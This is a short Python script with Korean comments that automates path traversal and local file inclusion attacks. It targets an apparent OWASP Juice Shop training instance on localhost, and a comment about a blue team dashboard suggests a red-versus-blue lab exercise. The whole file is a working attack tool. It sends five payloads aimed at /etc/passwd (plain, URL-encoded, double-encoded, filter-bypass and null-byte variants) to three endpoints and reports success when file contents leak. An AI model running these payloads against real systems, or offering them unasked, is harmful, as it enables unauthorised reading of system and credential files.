import requests
import time

# 1. 환경 설정
TARGET_BASE = "http://localhost:3000"  # 쥬스샵 주소
# 쥬스샵에서 경로 조작이 자주 일어나는 취약 지점들
TARGET_PATHS = [
    "/ftp",
    "/public/images",
    "/rest/products/search"
]

# 2. 다양한 우회 페이로드 (Path Traversal)
payloads = [
    "../../../../etc/passwd",               # 기본 패턴
    "..%2f..%2f..%2f..%2fetc%2fpasswd",       # URL 인코딩 (/)
    "..%252f..%252f..%252f..%252fetc%252fpasswd", # 더블 인코딩
    "....//....//....//etc/passwd",         # 필터링 우회 시도
    "/etc/passwd%00.jpg"                    # Null Byte Injection 시도
]

def run_lfi_automation():
    print(f"[*] Starting LFI/Path Traversal Automation...")

    for path in TARGET_PATHS:
        for payload in payloads:
            # 전체 URL 조합
            url = f"{TARGET_BASE}{path}/{payload}"

            try:
                # 공격 요청 전송
                response = requests.get(url, timeout=5)

                print(f"[!] Target: {path} | Payload: {payload[:20]}...")
                print(f"    - Status: {response.status_code}")

                # 만약 파일 내용이 출력된다면 (성공 징후)
                if "root:" in response.text:
                    print(f"    [!!!] SUCCESS: Vulnerability confirmed at {url}")

                time.sleep(0.5) # 블루팀 대시보드에서 흐름을 보기 위해 약간의 지연시간 추가

            except Exception as e:
                print(f"[X] Error: {e}")

if __name__ == "__main__":
    run_lfi_automation()